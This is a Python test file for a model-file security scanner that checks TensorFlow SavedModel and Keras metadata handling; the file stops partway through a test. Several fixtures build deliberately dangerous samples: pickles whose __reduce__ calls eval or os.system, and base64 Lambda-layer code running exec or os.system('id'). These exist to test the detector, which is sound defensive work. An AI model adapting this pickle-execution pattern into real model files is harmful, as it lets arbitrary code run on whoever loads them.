import base64
import hashlib
import io
import logging
import pickle
import shutil
from pathlib import Path
from typing import Any, Protocol, TypedDict

import pytest

import modelaudit.scanners.tf_savedmodel_scanner as tf_savedmodel_module
from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.core import determine_exit_code, scan_model_directory_or_file
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity, ScanResult
from modelaudit.utils.file.detection import PROTO0_1_MAX_PROBE_BYTES
from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as has_tf_protos


class _NodeCollection(Protocol):
    def add(self) -> Any:
        """Append a protobuf node and return the mutable node object."""


class _RequiredNodeSpec(TypedDict):
    op: str


class _NodeSpec(_RequiredNodeSpec, total=False):
    name: str
    inputs: list[str]
    string_attrs: dict[str, str]
    string_list_attrs: dict[str, list[str]]
    function_ref: str


# Defer TensorFlow check to avoid module-level imports
def has_tensorflow():
    try:
        import tensorflow as tf

        # Avoid treating vendored protobuf-only stubs as full TensorFlow runtime.
        return bool(getattr(tf, "__version__", None)) and hasattr(tf, "constant")
    except Exception:
        return False


def _protobuf_varint(value: int) -> bytes:
    chunks: list[int] = []
    while value > 0x7F:
        chunks.append((value & 0x7F) | 0x80)
        value >>= 7
    chunks.append(value)
    return bytes(chunks)


def _protobuf_bytes_field(field_number: int, payload: bytes) -> bytes:
    return _protobuf_varint((field_number << 3) | 2) + _protobuf_varint(len(payload)) + payload


def _keras_metadata_with_malformed_saved_object(payload: bytes) -> bytes:
    return _protobuf_bytes_field(1, payload)


def _keras_metadata_with_json_metadata(payload: bytes) -> bytes:
    return _protobuf_bytes_field(1, _protobuf_bytes_field(5, payload))


def test_tf_savedmodel_scanner_can_handle(tmp_path: Path) -> None:
    """Test the can_handle method of TensorFlowSavedModelScanner."""
    # Create a directory with saved_model.pb
    tf_dir = tmp_path / "tf_model"
    tf_dir.mkdir()
    (tf_dir / "saved_model.pb").write_bytes(b"dummy content")

    # Create a regular directory
    regular_dir = tmp_path / "regular_dir"
    regular_dir.mkdir()

    # Create a file
    test_file = tmp_path / "test.pb"
    test_file.write_bytes(b"dummy content")

    if has_tf_protos():
        # With vendored protos or TensorFlow, can_handle works for valid paths
        assert tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(tf_dir)) is True
        assert tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(regular_dir)) is False
        assert (
            tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(test_file)) is True
        )  # Now accepts any .pb file
    else:
        # Without protos, can_handle returns False
        assert tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(tf_dir)) is False
        assert tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(regular_dir)) is False
        assert tf_savedmodel_module.TensorFlowSavedModelScanner.can_handle(str(test_file)) is False


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_read_failure_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = _create_test_savedmodel_with_op(tmp_path, "Const", "unreadable_model")

    raw_secret = "ATTACKER_CONTROLLED_SAVEDMODEL_READ_FAILURE"

    def raise_os_error(*_args: object, **_kwargs: object) -> None:
        raise OSError(raw_secret)

    monkeypatch.setattr(
        tf_savedmodel_module.TensorFlowSavedModelScanner, "can_handle", classmethod(lambda _cls, _path: True)
    )
    monkeypatch.setattr(tf_savedmodel_module, "_open_bound_regular_file", raise_os_error)

    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(path)
    aggregate = scan_model_directory_or_file(path, cache_scan_results=False)

    read_checks = [check for check in direct.checks if check.name == "SavedModel File Read"]
    assert direct.success is False
    assert aggregate.success is False
    assert len(read_checks) == 1
    assert read_checks[0].status == CheckStatus.FAILED
    assert "Unable to read TF SavedModel file" in read_checks[0].message
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].details["analysis_incomplete"] is True
    assert read_checks[0].details["scan_outcome_reason"] == "savedmodel_read_failed"
    assert read_checks[0].details["exception"] == "<redacted>"
    assert "<redacted>" in read_checks[0].message
    assert raw_secret not in direct.to_json()
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.metadata["operational_error_reason"] == "savedmodel_read_failed"
    assert "savedmodel_read_failed" in direct.metadata["scan_outcome_reasons"]
    metadata = aggregate.file_metadata[str(Path(path) / "saved_model.pb")].model_dump()
    assert "savedmodel_read_failed" in metadata["scan_outcome_reasons"]
    assert metadata["operational_error_reason"] == "savedmodel_read_failed"
    assert any(
        check.name == "SavedModel File Read" and "Unable to read TF SavedModel file" in check.message
        for check in aggregate.checks
    )
    assert not [
        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
    ]
    assert determine_exit_code(aggregate) == 2


def test_savedmodel_keras_metadata_failure_redacts_exception() -> None:
    raw_secret = "ATTACKER_CONTROLLED_KERAS_METADATA_FAILURE"
    result = ScanResult(scanner_name="tf_savedmodel")

    tf_savedmodel_module.TensorFlowSavedModelScanner._mark_keras_metadata_scan_failure(
        result,
        "keras_metadata.pb",
        ValueError(raw_secret),
    )

    failure_checks = [check for check in result.checks if check.name == "Keras Metadata Parsing"]
    assert failure_checks
    assert failure_checks[0].details["exception"] == "<redacted>"
    assert "<redacted>" in failure_checks[0].message
    assert raw_secret not in result.to_json()


def test_savedmodel_graph_iteration_warning_redacts_exception(
    monkeypatch: pytest.MonkeyPatch,
    caplog: pytest.LogCaptureFixture,
) -> None:
    raw_secret = "ATTACKER_CONTROLLED_GRAPH_ITERATION_FAILURE"
    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()

    def fail_iteration(_saved_model: object) -> Any:
        raise RuntimeError(raw_secret)

    monkeypatch.setattr(scanner, "_iter_saved_model_node_contexts", fail_iteration)

    with caplog.at_level(logging.WARNING, logger=tf_savedmodel_module.__name__):
        assert scanner._scan_tf_operations(object()) == []

    assert "Failed to iterate TensorFlow graph: <redacted>" in caplog.text
    assert raw_secret not in caplog.text


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_unreadable_file_preflight_is_operational(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_dir = Path(_create_test_savedmodel_with_op(tmp_path, "Const", "permission_denied_model"))
    path = model_dir / "saved_model.pb"

    monkeypatch.setattr("modelaudit.scanners.base.os.access", lambda _path, _mode: False)

    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(path))
    aggregate = scan_model_directory_or_file(str(path), cache_scan_results=False)

    assert direct.metadata["operational_error_reason"] == "savedmodel_read_failed"
    assert aggregate.file_metadata[str(path)].model_dump()["operational_error_reason"] == "savedmodel_read_failed"
    assert determine_exit_code(aggregate) == 2


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_unreadable_keras_metadata_is_operational(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    metadata_path = tmp_path / "keras_metadata.pb"
    metadata_path.write_bytes(b"safe metadata")

    def raise_os_error(*_args: object, **_kwargs: object) -> None:
        raise OSError("simulated Keras metadata read failure")

    monkeypatch.setattr(tf_savedmodel_module, "_open_bound_regular_file", raise_os_error)

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
    aggregate = scan_model_directory_or_file(str(metadata_path), cache_scan_results=False)

    assert result.metadata["operational_error_reason"] == "savedmodel_read_failed"
    assert result.metadata["scan_outcome_reasons"] == ["savedmodel_read_failed"]
    assert any(check.name == "SavedModel File Read" for check in result.checks)
    assert (
        aggregate.file_metadata[str(metadata_path)].model_dump()["operational_error_reason"] == "savedmodel_read_failed"
    )
    assert determine_exit_code(aggregate) == 2


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_directory_keeps_keras_metadata_read_failure_operational(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_dir = Path(_create_test_savedmodel_with_op(tmp_path, "Const", "metadata_failure_model"))
    metadata_path = model_dir / "keras_metadata.pb"
    metadata_path.write_bytes(b"safe metadata")
    real_bound_open = tf_savedmodel_module._open_bound_regular_file

    def fail_metadata_read(file: Path, *args: Any, **kwargs: Any) -> Any:
        if file == metadata_path:
            raise OSError("simulated Keras metadata read failure")
        return real_bound_open(file, *args, **kwargs)

    monkeypatch.setattr(tf_savedmodel_module, "_open_bound_regular_file", fail_metadata_read)

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))

    assert result.metadata["operational_error_reason"] == "savedmodel_read_failed"
    assert result.metadata["scan_outcome_reasons"] == ["savedmodel_read_failed"]
    assert any(check.name == "SavedModel File Read" and check.location == str(metadata_path) for check in result.checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_directory_malformed_keras_metadata_is_inconclusive(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    metadata_path = model_dir / "keras_metadata.pb"
    metadata_path.write_bytes(b"\x0a\x05abc")

    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    aggregate = scan_model_directory_or_file(str(model_dir), cache_scan_results=False)

    parse_checks = [
        check
        for check in direct.checks
        if check.name == "Keras Metadata Parsing" and check.location == str(metadata_path)
    ]
    assert direct.success is False
    assert aggregate.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.metadata["operational_error_reason"] == "keras_metadata_parse_failed"
    assert direct.metadata["scan_outcome_reasons"] == ["keras_metadata_parse_failed"]
    assert len(parse_checks) == 1
    assert parse_checks[0].status == CheckStatus.FAILED
    assert parse_checks[0].severity == IssueSeverity.INFO
    assert parse_checks[0].details["analysis_incomplete"] is True
    assert parse_checks[0].details["scan_outcome_reason"] == "keras_metadata_parse_failed"
    assert determine_exit_code(aggregate) == 2


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_directory_oversized_keras_metadata_is_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    metadata_path = model_dir / "keras_metadata.pb"
    metadata_path.write_bytes(b"A" * 33)
    monkeypatch.setattr(tf_savedmodel_module, "_MAX_KERAS_METADATA_PARSE_BYTES", 32)

    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    aggregate = scan_model_directory_or_file(str(model_dir), cache_scan_results=False)

    budget_checks = [
        check
        for check in direct.checks
        if check.name == "Keras Metadata Parse Budget" and check.location == str(metadata_path)
    ]
    assert direct.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.metadata["operational_error_reason"] == "keras_metadata_parse_budget_exceeded"
    assert direct.metadata["scan_outcome_reasons"] == ["keras_metadata_parse_budget_exceeded"]
    assert len(budget_checks) == 1
    assert budget_checks[0].status == CheckStatus.FAILED
    assert budget_checks[0].severity == IssueSeverity.INFO
    assert budget_checks[0].details["analysis_incomplete"] is True
    assert budget_checks[0].details["max_parse_bytes"] == 32
    assert determine_exit_code(aggregate) == 2


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_standalone_malformed_keras_metadata_is_inconclusive(tmp_path: Path) -> None:
    metadata_path = tmp_path / "keras_metadata.pb"
    metadata_path.write_bytes(b"\x0a\x05abc")

    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
    aggregate = scan_model_directory_or_file(str(metadata_path), cache_scan_results=False)

    parse_checks = [
        check
        for check in direct.checks
        if check.name == "Keras Metadata Parsing" and check.location == str(metadata_path)
    ]
    assert direct.success is False
    assert aggregate.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.metadata["operational_error_reason"] == "keras_metadata_parse_failed"
    assert direct.metadata["scan_outcome_reasons"] == ["keras_metadata_parse_failed"]
    assert len(parse_checks) == 1
    assert parse_checks[0].status == CheckStatus.FAILED
    assert parse_checks[0].severity == IssueSeverity.INFO
    assert parse_checks[0].details["analysis_incomplete"] is True
    assert parse_checks[0].details["scan_outcome_reason"] == "keras_metadata_parse_failed"
    assert determine_exit_code(aggregate) == 2


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_standalone_nested_malformed_keras_metadata_is_inconclusive(tmp_path: Path) -> None:
    metadata_path = tmp_path / "keras_metadata.pb"
    metadata_path.write_bytes(_keras_metadata_with_malformed_saved_object(b"abc"))

    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
    aggregate = scan_model_directory_or_file(str(metadata_path), cache_scan_results=False)

    assert direct.success is False
    assert aggregate.success is False
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.metadata["operational_error_reason"] == "keras_metadata_parse_failed"
    assert direct.metadata["scan_outcome_reasons"] == ["keras_metadata_parse_failed"]
    assert any(check.name == "Keras Metadata Parsing" for check in direct.checks)
    assert determine_exit_code(aggregate) == 2


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_standalone_oversized_keras_metadata_is_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    metadata_path = tmp_path / "keras_metadata.pb"
    metadata_path.write_bytes(b"A" * 33)
    monkeypatch.setattr(tf_savedmodel_module, "_MAX_KERAS_METADATA_PARSE_BYTES", 32)
    monkeypatch.setattr(
        tf_savedmodel_module.TensorFlowSavedModelScanner,
        "calculate_file_hashes",
        lambda *_args, **_kwargs: pytest.fail("oversized metadata must be rejected before hashing"),
    )

    direct = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))
    aggregate = scan_model_directory_or_file(str(metadata_path), cache_scan_results=False)

    assert direct.success is False
    assert direct.bytes_scanned == 0
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert direct.metadata["operational_error_reason"] == "keras_metadata_parse_budget_exceeded"
    assert direct.metadata["scan_outcome_reasons"] == ["keras_metadata_parse_budget_exceeded"]
    assert any(
        check.name == "Keras Metadata Parse Budget"
        and check.location == str(metadata_path)
        and check.details["max_parse_bytes"] == 32
        for check in direct.checks
    )
    assert not any(check.name == "File Integrity Hash" for check in direct.checks)
    assert determine_exit_code(aggregate) == 2


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_malformed_keras_metadata_preserves_lambda_detection(tmp_path: Path) -> None:
    encoded_code = base64.b64encode(b'exec("print(1)")').decode()
    metadata_path = tmp_path / "keras_metadata.pb"
    metadata_path.write_bytes(f'"class_name": "Lambda", "function": {{"items": ["{encoded_code}"]}}'.encode())

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert any(check.name == "Keras Metadata Parsing" for check in result.checks)
    assert any(
        issue.message
        and "Lambda layer contains dangerous code" in issue.message
        and issue.severity == IssueSeverity.CRITICAL
        for issue in result.issues
    )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_malformed_tail_preserves_lambda_detection(tmp_path: Path) -> None:
    encoded_code = base64.b64encode(b'exec("print(1)")').decode()
    lambda_metadata = _keras_metadata_with_json_metadata(
        f'"class_name": "Lambda", "function": {{"items": ["{encoded_code}"]}}'.encode()
    )
    metadata_path = tmp_path / "keras_metadata.pb"
    metadata_path.write_bytes(lambda_metadata + b"\x0a\x05abc")

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert any(check.name == "Keras Metadata Parsing" for check in result.checks)
    assert any(
        issue.message
        and "Lambda layer contains dangerous code" in issue.message
        and issue.severity == IssueSeverity.CRITICAL
        for issue in result.issues
    )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_directory_valid_keras_metadata_preserves_success(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    metadata_path = model_dir / "keras_metadata.pb"
    metadata_path.write_bytes(_keras_metadata_with_json_metadata(b'{"class_name": "Dense"}'))

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))

    assert result.success is True
    assert "scan_outcome" not in result.metadata
    assert not any(check.name == "Keras Metadata Parsing" for check in result.checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_standalone_unknown_keras_metadata_fields_preserve_success(tmp_path: Path) -> None:
    metadata_path = tmp_path / "keras_metadata.pb"
    metadata_path.write_bytes(_protobuf_bytes_field(2, b"forward-compatible"))

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))

    assert result.success is True
    assert "scan_outcome" not in result.metadata
    assert not any(check.name == "Keras Metadata Parsing" for check in result.checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_standalone_keras_metadata_swap_to_oversized_is_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    metadata_path = tmp_path / "keras_metadata.pb"
    metadata_path.write_bytes(b"A")
    monkeypatch.setattr(tf_savedmodel_module, "_MAX_KERAS_METADATA_PARSE_BYTES", 32)

    @tf_savedmodel_module.contextlib.contextmanager
    def oversized_metadata(*_args: Any, **_kwargs: Any) -> Any:
        yield io.BytesIO(b"A" * 33)

    monkeypatch.setattr(tf_savedmodel_module, "_open_bound_regular_file", oversized_metadata)
    monkeypatch.setattr(
        tf_savedmodel_module.TensorFlowSavedModelScanner,
        "calculate_file_hashes",
        lambda *_args, **_kwargs: pytest.fail("bounded metadata scans must not reopen the path for hashing"),
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))

    assert result.success is False
    assert result.bytes_scanned == 32
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert result.metadata["operational_error_reason"] == "keras_metadata_parse_budget_exceeded"
    assert not any(check.name == "File Integrity Hash" for check in result.checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_standalone_in_budget_keras_metadata_hashes_bounded_content(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    metadata_path = tmp_path / "keras_metadata.pb"
    content = _keras_metadata_with_json_metadata(b'{"class_name": "Dense"}')
    metadata_path.write_bytes(content)
    monkeypatch.setattr(tf_savedmodel_module, "_MAX_KERAS_METADATA_PARSE_BYTES", len(content))
    monkeypatch.setattr(
        tf_savedmodel_module.TensorFlowSavedModelScanner,
        "calculate_file_hashes",
        lambda *_args, **_kwargs: pytest.fail("bounded metadata scans must hash the analyzed bytes"),
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))

    integrity_checks = [check for check in result.checks if check.name == "File Integrity Hash"]
    assert result.success is True
    assert result.bytes_scanned == len(content)
    assert len(integrity_checks) == 1
    assert integrity_checks[0].details["sha256"] == hashlib.sha256(content).hexdigest()
    assert integrity_checks[0].details["file_size"] == len(content)
    assert result.metadata["file_hashes"]["sha256"] == hashlib.sha256(content).hexdigest()


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_standalone_keras_metadata_tolerates_disabled_md5(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    metadata_path = tmp_path / "keras_metadata.pb"
    content = _keras_metadata_with_json_metadata(b'{"class_name": "Dense"}')
    metadata_path.write_bytes(content)

    def reject_md5(*_args: object, **_kwargs: object) -> None:
        raise ValueError("MD5 disabled by system policy")

    monkeypatch.setattr(tf_savedmodel_module.hashlib, "md5", reject_md5)

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))

    integrity_checks = [check for check in result.checks if check.name == "File Integrity Hash"]
    assert result.success is True
    assert len(integrity_checks) == 1
    assert integrity_checks[0].details["md5"] is None
    assert integrity_checks[0].details["sha256"] == hashlib.sha256(content).hexdigest()
    assert result.metadata["file_hashes"]["md5"] is None
    assert not any(check.name == "Keras Metadata Scan" for check in result.checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_standalone_keras_metadata_scans_when_md5_is_disabled(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    decoded_code = b'import os\nos.system("id")'
    encoded_code = base64.b64encode(decoded_code).decode()
    metadata_path = tmp_path / "keras_metadata.pb"
    metadata_path.write_bytes(f'"class_name": "Lambda", "function": {{"items": ["{encoded_code}"]}}'.encode())

    def reject_md5(*_args: object, **_kwargs: object) -> None:
        raise ValueError("MD5 disabled by system policy")

    monkeypatch.setattr(tf_savedmodel_module.hashlib, "md5", reject_md5)

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(metadata_path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert any(check.name == "Keras Metadata Parsing" for check in result.checks)
    assert any(
        check.name == "Lambda Layer Security Check"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )
    assert result.metadata["file_hashes"]["md5"] is None
    assert result.metadata["file_hashes"]["sha256"]
    assert not any(check.name == "Keras Metadata Scan" for check in result.checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_in_budget_keras_metadata_preserves_success(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    metadata_path = model_dir / "keras_metadata.pb"
    metadata_path.write_bytes(_keras_metadata_with_json_metadata(b'{"class_name": "Dense"}'))
    monkeypatch.setattr(tf_savedmodel_module, "_MAX_KERAS_METADATA_PARSE_BYTES", 64)

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))

    assert result.success is True
    assert "scan_outcome" not in result.metadata
    assert not any(check.name == "Keras Metadata Parse Budget" for check in result.checks)


def test_suspicious_function_name_reuses_precompiled_patterns(monkeypatch: pytest.MonkeyPatch) -> None:
    """Function-name matching should not rebuild static regexes per call."""

    def fail_compile(*_args: Any, **_kwargs: Any) -> None:
        raise AssertionError("unexpected regex compilation")

    monkeypatch.setattr("modelaudit.scanners.tf_savedmodel_scanner.re.compile", fail_compile)

    assert (
        tf_savedmodel_module.TensorFlowSavedModelScanner._match_suspicious_function_name("safe_function_name") is None
    )
    assert tf_savedmodel_module.TensorFlowSavedModelScanner._match_suspicious_function_name("module.eval") == "eval"


def create_tf_savedmodel(tmp_path: Path, *, malicious: bool = False) -> Path:
    """Create a mock TensorFlow SavedModel directory for testing."""
    import importlib

    importlib.import_module("modelaudit.protos")
    from tensorflow.core.protobuf.saved_model_pb2 import SavedModel

    # Create a directory that mimics a TensorFlow SavedModel
    model_dir = tmp_path / "tf_model"
    model_dir.mkdir()

    # Create a minimal valid SavedModel protobuf
    saved_model = SavedModel()

    # Add a meta graph
    meta_graph = saved_model.meta_graphs.add()

    # Add a simple graph
    graph_def = meta_graph.graph_def

    # Add a simple constant node
    node = graph_def.node.add()
    node.name = "Const"
    node.op = "Const"

    if malicious:
        # Add a suspicious operation
        suspicious_node = graph_def.node.add()
        suspicious_node.name = "suspicious_op"
        suspicious_node.op = "PyFunc"  # This is in our suspicious ops list

    # Write the protobuf to file
    with (model_dir / "saved_model.pb").open("wb") as f:
        f.write(saved_model.SerializeToString())

    # Create variables directory
    variables_dir = model_dir / "variables"
    variables_dir.mkdir()

    # Create variables.index
    (variables_dir / "variables.index").write_bytes(b"dummy index content")

    # Create variables.data
    (variables_dir / "variables.data-00000-of-00001").write_bytes(b"dummy data content")

    # Create assets directory
    assets_dir = model_dir / "assets"
    assets_dir.mkdir()

    # If malicious, add a malicious pickle file
    if malicious:

        class MaliciousClass:
            def __reduce__(self):
                return (eval, ("print('malicious code')",))

        malicious_data = {"malicious": MaliciousClass()}
        malicious_pickle = pickle.dumps(malicious_data)
        (model_dir / "malicious.pkl").write_bytes(malicious_pickle)

    return model_dir


def _build_protocol1_pickle_payload() -> bytes:
    import os as os_module

    class DangerousPayload:
        def __reduce__(self) -> tuple[object, tuple[str]]:
            return (os_module.system, ("echo savedmodel-asset-test",))

    return pickle.dumps(DangerousPayload(), protocol=1)


def _build_minimal_pe_bytes() -> bytes:
    payload = bytearray(0x80)
    payload[0:2] = b"MZ"
    payload[0x3C:0x40] = (0x40).to_bytes(4, "little")
    payload[0x40:0x44] = b"PE\x00\x00"
    return bytes(payload)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_scanner_safe_model(tmp_path: Path) -> None:
    """Test scanning a safe TensorFlow SavedModel."""
    model_dir = create_tf_savedmodel(tmp_path)

    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
    result = scanner.scan(str(model_dir))

    assert result.success is True
    assert result.bytes_scanned > 0

    # Check for issues - a safe model might still have some informational issues
    error_issues = [issue for issue in result.issues if issue.severity == IssueSeverity.CRITICAL]
    assert len(error_issues) == 0


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_scanner_malicious_model(tmp_path: Path) -> None:
    """Test scanning a malicious TensorFlow SavedModel."""
    model_dir = create_tf_savedmodel(tmp_path, malicious=True)

    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
    result = scanner.scan(str(model_dir))

    assert result.success is False

    # The scanner should detect errors from:
    # 1. Malicious pickle files in the directory, OR
    # 2. Suspicious TensorFlow operations (e.g. PyFunc), OR
    # 3. Both malicious files and suspicious operations
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)
    assert any(
        "malicious.pkl" in issue.message.lower()
        or "eval" in issue.message.lower()
        or "pyfunc" in issue.message.lower()
        or "suspicious" in issue.message.lower()
        for issue in result.issues
    )

    # Issues about PyFunc operations should include a 'why' explanation
    pyfunc_issues = [issue for issue in result.issues if issue.message and "PyFunc" in issue.message]
    assert any(issue.why is not None for issue in pyfunc_issues)


def test_tf_savedmodel_scanner_invalid_model(tmp_path):
    """Test scanning an invalid TensorFlow SavedModel."""
    # Create an invalid model directory (missing required files)
    invalid_dir = tmp_path / "invalid_model"
    invalid_dir.mkdir()
    (invalid_dir / "saved_model.pb").write_bytes(b"dummy content")
    # Missing variables directory

    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
    result = scanner.scan(str(invalid_dir))

    # Should have issues about invalid protobuf format or TensorFlow not installed
    # Note: Missing dependencies are WARNING (not security issue), errors in parsing are CRITICAL
    assert len(result.issues) > 0
    assert any(
        "error" in issue.message.lower()
        or "parsing" in issue.message.lower()
        or "invalid" in issue.message.lower()
        or "tensorflow not installed" in issue.message.lower()
        for issue in result.issues
    )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_detect_readfile_operation(tmp_path: Path) -> None:
    # Synthesize a SavedModel containing a ReadFile node
    model_path = _create_test_savedmodel_with_op(tmp_path, "ReadFile", "readfile_test")
    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
    result = scanner.scan(model_path)

    readfile_issues = [i for i in result.issues if i.message and "ReadFile" in i.message]
    assert readfile_issues, "Expected detection for ReadFile operation"
    assert any(i.severity == IssueSeverity.CRITICAL for i in readfile_issues)
    # Ensure an explanation is provided for developer guidance
    assert any(i.why for i in readfile_issues), "Missing explanation for ReadFile detection"


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_detect_pyfunc_operation(tmp_path: Path) -> None:
    model_path = _create_test_savedmodel_with_op(tmp_path, "PyFunc", "pyfunc_test")
    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
    result = scanner.scan(model_path)

    pyfunc_issues = [i for i in result.issues if i.message and "PyFunc" in i.message]
    assert pyfunc_issues, "Expected detection for PyFunc operation"
    assert any(i.severity == IssueSeverity.CRITICAL for i in pyfunc_issues)
    assert any(i.why for i in pyfunc_issues), "Missing explanation for PyFunc detection"


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
@pytest.mark.parametrize("op_name", ["LoadLibrary", "LoadLibraryV2"])
def test_detect_loadlibrary_operation(tmp_path: Path, op_name: str) -> None:
    model_path = _create_test_savedmodel_with_op(tmp_path, op_name, f"{op_name.lower()}_test")

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(model_path)

    load_library_issues = [
        issue
        for issue in result.issues
        if issue.message and f"Dangerous TensorFlow operation: {op_name}" in issue.message
    ]
    assert result.success is False
    assert load_library_issues
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in load_library_issues)
    assert all(issue.details.get("op_type") == op_name for issue in load_library_issues)
    assert all(issue.why for issue in load_library_issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_detect_writefile_operation(tmp_path: Path) -> None:
